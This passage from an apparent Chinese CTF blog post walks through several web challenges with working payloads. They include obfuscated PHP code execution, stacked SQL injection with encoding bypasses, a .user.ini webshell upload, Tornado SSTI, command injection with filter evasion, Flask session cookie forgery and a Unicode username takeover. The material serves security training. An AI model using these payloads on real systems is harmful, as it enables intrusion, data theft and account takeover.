class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))))))</span><br></pre></td></tr></table></figure>

<p>在根目录发现 flag 文件<code>f1agg</code>。<br> 最终 payload 构造：<code>(serIALIze)(FILe(/f1agg))</code>读取文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))(((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)|((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).(((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))))</span><br></pre></td></tr></table></figure>

<p>注意最后发送的时候需要再 URLencode 一下。</p>
<h3 id="3-强网杯-2019-随便注"><a href="#3-强网杯-2019-随便注" class="headerlink" title="3.[强网杯 2019]随便注"></a>3.[强网杯 2019]随便注</h3><p>推一波MrYunen师傅的<a href="https://xz.aliyun.com/t/7169#toc-47" target="_blank" rel="noopener">注入圣经</a></p>
<p>尝试语句<code>1&#39; or 1=1 #</code>发现返回多个结果，说明存在注入</p>
<p>接着 order by爆字段 发现就两个字段</p>
<p>然后查询数据，有过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure>

<p>这里可以利用堆叠注入，原理很简单，就是通过 ; 号注入多条SQL语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1'; <span class="keyword">show</span> <span class="keyword">databases</span>; <span class="comment">#</span></span><br><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br><span class="line">1'; <span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>; <span class="comment">#  //表名是数字用反引号</span></span><br></pre></td></tr></table></figure>

<p>flag就在这串数字表中</p>
<ol>
<li><p>通过编码绕过</p>
<p> 因为select被过滤了，所以先将 select * from  `1919810931114514` 进行16进制编码再通过构造payload得</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">0';<span class="keyword">SeT</span>@a=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> @a;<span class="keyword">execute</span> execsql;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p> 当然也可以通过 <code>char()</code></p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">0';<span class="keyword">set</span> @s=<span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">99</span>),<span class="built_in">char</span>(<span class="number">116</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">97</span>),<span class="built_in">char</span>(<span class="number">103</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>),<span class="built_in">char</span>(<span class="number">114</span>),<span class="built_in">char</span>(<span class="number">111</span>),<span class="built_in">char</span>(<span class="number">109</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">96</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">57</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">57</span>),<span class="built_in">char</span>(<span class="number">56</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">48</span>),<span class="built_in">char</span>(<span class="number">57</span>),<span class="built_in">char</span>(<span class="number">51</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">52</span>),<span class="built_in">char</span>(<span class="number">53</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">52</span>),<span class="built_in">char</span>(<span class="number">96</span>));<span class="keyword">PREPARE</span> a <span class="keyword">FROM</span> @s;<span class="keyword">EXECUTE</span> a;</span><br></pre></td></tr></table></figure>

<ul>
<li>prepare…from…是预处理语句，会进行编码转换。</li>
<li>execute用来执行由SQLPrepare创建的SQL语句。</li>
<li>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</li>
</ul>
</li>
<li><p>handler</p>
<p> mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1'; <span class="keyword">handler</span> <span class="string">`1919810931114514`</span> <span class="keyword">open</span> <span class="keyword">as</span> <span class="string">`a`</span>; <span class="keyword">handler</span> <span class="string">`a`</span> <span class="keyword">read</span> <span class="keyword">next</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="4-SUCTF-2019-CheckIn"><a href="#4-SUCTF-2019-CheckIn" class="headerlink" title="4.[SUCTF 2019]CheckIn"></a>4.[SUCTF 2019]CheckIn</h3><p>文件的内容不能包含<code>&lt;?</code>，但可以上传<code>&lt;script language=&#39;php&#39;&gt;&lt;scirpt&gt;</code>类型的图片马来绕过</p>
<p>利用 <code>.user.ini</code>绕过,解析php</p>
<p>利用前提</p>
<ol>
<li>服务器脚本语言为PHP</li>
<li>服务器使用CGI／FastCGI模式</li>
<li>上传目录下要有可执行的php文件</li>
</ol>
<p><img src="/2020/06/6月刷题记录/image-20200608004804065.png" alt="image-20200608004804065"></p>
<p>关键在这两个关键字</p>
<p><img src="/2020/06/6月刷题记录/image-20200608004839982.png" alt="image-20200608004839982"></p>
<p><strong>auto_prepend_file</strong>是在文件前插入；<strong>auto_append_file</strong>在文件最后插入（当文件调用的有<code>exit()</code>时该设置无效）</p>
<p>先上传 <code>.user.ini</code></p>
<p><img src="/2020/06/6月刷题记录/image-20200608005009468.png" alt="image-20200608005009468"></p>
<p>接着传马</p>
<p><img src="/2020/06/6月刷题记录/image-20200608005047907.png" alt="image-20200608005047907"></p>
<p>再去访问上传目录即可获得flag</p>
<h3 id="5-护网杯-2018-easy-tornado"><a href="#5-护网杯-2018-easy-tornado" class="headerlink" title="5.[护网杯 2018]easy_tornado"></a>5.[护网杯 2018]easy_tornado</h3><p>flag.txt 提示flag在 <code>/fllllllllllllag</code> </p>
<p>welcome.txt 的render 可能存在SSTI注入</p>
<p>hints.txt 提示我们 filehash的加密格式 md5(cookie_secret+md5(filename))</p>
<p>先直接访问 <code>/fllllllllllllag</code>  直接报错，看URL应该是SSTI注入</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/error?msg=&#123;&#123;<span class="number">2</span>^<span class="number">1</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>直接回显 <code>3</code> ，过滤了很多符号，命令执行就别想了</p>
<p>说明确实存在注入。后面如何通过注入得到 cookie_secret实在是不知道</p>
<p>大佬一句 阅读tornado源码</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/tornadoweb/</span>tornado<span class="regexp">/blob/m</span>aster<span class="regexp">/tornado/</span>auth.py</span><br></pre></td></tr></table></figure>

<p>发现<code>handler.settings</code>存放了cookie_secret （ORZ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">cookie_secret = <span class="string">'8bf1192d-691c-4345-8667-78a8a7899ff0'</span></span><br><span class="line">filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line">hash = hashlib.md5((cookie_secret + hashlib.md5(filename.encode()).hexdigest()).encode())</span><br><span class="line">print(hash.hexdigest())</span><br></pre></td></tr></table></figure>

<p>构造下URL即可拿到flag</p>
<h3 id="6-GXYCTF2019-Ping-Ping-Ping"><a href="#6-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="6.[GXYCTF2019]Ping Ping Ping"></a>6.[GXYCTF2019]Ping Ping Ping</h3><p>简单的命令注入</p>
<p>直接用 <code>;</code>分割命令成功，直接执行 <code>ls</code>回显 <code>flag.php</code>和<code>index.php</code>接着读<code>index.php</code>发现过滤了空格用 <code>$IFS$9</code>绕过</p>
<p>得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/bash/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your bash!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your flag!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我用的是base64绕过</p>
<p>payload </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">;`<span class="built_in">echo</span><span class="variable">$IFS</span><span class="variable">$9Y2F0IGZsYWcucGhwCg</span>==|base64<span class="variable">$IFS</span><span class="variable">$9</span>-d`</span><br></pre></td></tr></table></figure>

<p>其他payload</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">cat</span><span class="variable">$IFS</span><span class="variable">$1</span>`<span class="keyword">ls</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment">// if(preg_match("/.*f.*l.*a.*g.*/", $ip))&#123;</span></span><br><span class="line"><span class="comment">//    die("fxck your flag!");</span></span><br><span class="line"><span class="comment">//匹配一个字符串中，是否按顺序出现过flag四个字母</span></span><br><span class="line">;a=<span class="keyword">g</span>;<span class="keyword">cat</span><span class="variable">$IFS</span><span class="variable">$1fla</span><span class="variable">$a</span>.php</span><br></pre></td></tr></table></figure>

<h3 id="7-HCTF-2018-admin"><a href="#7-HCTF-2018-admin" class="headerlink" title="7.[HCTF 2018]admin"></a>7.[HCTF 2018]admin</h3><p>在登录页面的注释中有一句</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- you are not admin --&gt;</span></span><br></pre></td></tr></table></figure>

<p>随便注册个账号进去，在改变密码的页面注释泄露github地址<a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/</a></p>
<p>在index.html中</p>
<p><img src="/2020/06/6月刷题记录/image-20200622145001059.png" alt="image-20200622145001059"></p>
<p>admin登录后得到flag</p>
<p>这道题有两种解法</p>
<ul>
<li><p>session伪造</p>
<p>  根据P师傅的<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">文章</a>，flask的session都是在本地的，通过一个SECRET_KEY进行签名,可以直接使用<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">脚本</a>进行加解密</p>
  <figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">python flask_session_cookie_manager<span class="number">3</span>.py decode -<span class="keyword">c</span> .eJxFUE<span class="number">2</span>LwjAU_CvLO<span class="number">3</span>uIFi-CB<span class="number">6E2</span>VHgvWFLDy<span class="number">0</span>VcrW<span class="number">3</span>axoW<span class="number">2</span>Ylvxv<span class="number">2</span>_Xhd<span class="number">3</span>DnGaYryccr<span class="number">03</span>WFrDqmns<span class="number">2</span>g<span class="number">6</span>O<span class="number">7</span>wOoJH<span class="number">5</span>-wAlzgkj<span class="number">0</span>LNFQrmRQqjAXrxOF<span class="number">4</span>FlZHzpZFhWFRsIk<span class="number">8</span>euvYpAPrNKCSfrRLJdOedT<span class="number">5</span>ajz<span class="number">3</span>Jg<span class="number">1</span>fhXqCO<span class="number">59</span>bwYP<span class="number">2</span>hVLoKUMYPkuR<span class="number">5</span>rAb<span class="number">2</span>SUmG<span class="number">52</span>xQqHDnUEbeSlzwuFnimAdWpsOE<span class="number">0</span>YYHN-XXrLlHiQMZXMNrBue<span class="number">2</span>uR<span class="number">67</span>ryq<span class="number">7</span>_U<span class="number">2</span>wfttbY<span class="number">2</span>vUG<span class="number">0</span>EyqaZaAZdFjT<span class="number">6</span>pyewXpPePqcZAeleRjAMVbgVt<span class="number">1</span>m<span class="number">8750959</span>n<span class="number">9</span>GZAXlv<span class="number">8</span>zt<span class="number">5</span>CcCuqztYAb<span class="number">3</span>Nmvet<span class="number">8</span>FcwOsb<span class="number">4</span>eJsVg.XvhXYA.DtOXFn-B-CxhrW<span class="number">07</span>nqEb<span class="number">1</span><span class="keyword">i9</span>eswM</span><br><span class="line"></span><br><span class="line">'&#123;<span class="string">"_fresh"</span>:True,<span class="string">"_id"</span>:b<span class="string">"3c9bf41ce8da824a4b374e1bf8d08aaaf2fbae2a5763a8298e1a83fc14ef844125ef2fec9970b04cfc92bdc5f5ac482b0afdc6c09387de2de3d5be1ea610c25c"</span>,<span class="string">"csrf_token"</span>:b<span class="string">"fa1efe1044dd827b8e2de5d654099252d4b78144"</span>,<span class="string">"image"</span>:b<span class="string">"0Vt6"</span>,<span class="string">"name"</span>:<span class="string">"admin"</span>,<span class="string">"user_id"</span>:<span class="string">"10"</span>&#125;'</span><br></pre></td></tr></table></figure>

<p>  然后源码中有SECRET_KEY</p>
<p>  <img src="/2020/06/6月刷题记录/image-20200622144648942.png" alt="image-20200622144648942"></p>
  <figure class="highlight csp"><table><tr><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -t "&#123;<span class="string">'_fresh'</span>: True,<span class="string">'_id'</span>: b<span class="string">'3c9bf41ce8da824a4b374e1bf8d08aaaf2fbae2a5763a8298e1a83fc14ef844125ef2fec9970b04cfc92bdc5f5ac482b0afdc6c09387de2de3d5be1ea610c25c'</span>,<span class="string">'csrf_token'</span>:b<span class="string">'fa1efe1044dd827b8e2de5d654099252d4b78144'</span>,<span class="string">'image'</span>:b<span class="string">'0Vt6'</span>,<span class="string">'name'</span>:<span class="string">'admin'</span>,<span class="string">'user_id'</span>:<span class="string">'10'</span>&#125;" -s ckj123</span><br><span class="line">.eJxFUE1rwkAQ_Stlzh5WgxfBgxCzRJgJho3L7EWsxmSTjIWomET8700ttId3eo_39YT9uc2vJSxu7T2fwN6fYPGEj09YAM5wzsIKLTWJTsskjBWb1ONwVM5E3lVljWFZso0ExXm2Wc8mC6iiH-080VnHphicYEd6J0m4VWjiqbPcO9lViakD1PGDNAkPdc-SVmR5yhZVEm486kicxhkPqzkOReB01o8YXLjzY37DhjvU2JPFJbwmcLy25_3tq84vfxOcrDtnXYNmpUin9Vgr4KpsUNKG7HZGZvsYa_RkNjXpOEjCtaLV8m3n5VDk_2dETlHxy1wOMhJwOIm_wATu17x9_wZTBa9vTipsnw.XvhesQ.opeFEuwbfnBJs_j3BEQR_eCGvXE</span><br></pre></td></tr></table></figure>


</li>
</ul>
<pre><code>用这个cookie访问 即可得到flag</code></pre><ul>
<li><p>Unicode欺骗</p>
<p>  源码中显示，各种操作前都会对用户名进行自定义的strlower</p>
  <figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span></span><span class="symbol">:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>

<p>  nodeprep.prepare对应的库是Twisted，requirements.txt中显示Twisted==10.2.0</p>
<p>  版本非常老。</p>
<p>  unicode问题，对于一些特殊字符，nodeprep.prepare会进行如下操作</p>
  <figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">ᴬ -&gt; A -&gt; a</span><br></pre></td></tr></table></figure>

<p>  即第一次将其转换为大写，第二次将其转换为小写</p>
<p>  那么，攻击链大概就这样</p>
<ul>
<li>注册用户ᴬdmin</li>
<li>登录用户ᴬdmin，变成Admin</li>
<li>修改密码Admin，更改了admin的密码</li>
</ul>
</li>
</ul>
<h3 id="8-DASCTF-六月赛-简单的计算题"><a href="#8-DASCTF-六月赛-简单的计算题" class="headerlink" title="8.[DASCTF 六月赛]简单的计算题"></a>8.<strong>[DASCTF 六月赛]简单的计算题</strong></h3><p>最开始的源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request,session</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> create</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## flag is in /flag try to get it</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(string)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"or"</span> <span class="keyword">in</span> string:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"hack"</span></span><br><span class="line">        <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        input = request.form[<span class="string">'input'</span>]</span><br><span class="line">        create_question = create()</span><br><span class="line">        input_question = session.get(<span class="string">'question'</span>)</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">if</span> input_question==<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"Invalid session please try again!"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">if</span> filter(input)==<span class="string">"hack"</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"hack"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            calc_result = str((eval(input_question + <span class="string">"="</span> + str(input))))</span><br><span class="line">            <span class="keyword">if</span> calc_result == <span class="string">'True'</span>:</span><br><span class="line">                result = <span class="string">"Congratulations"</span></span><br><span 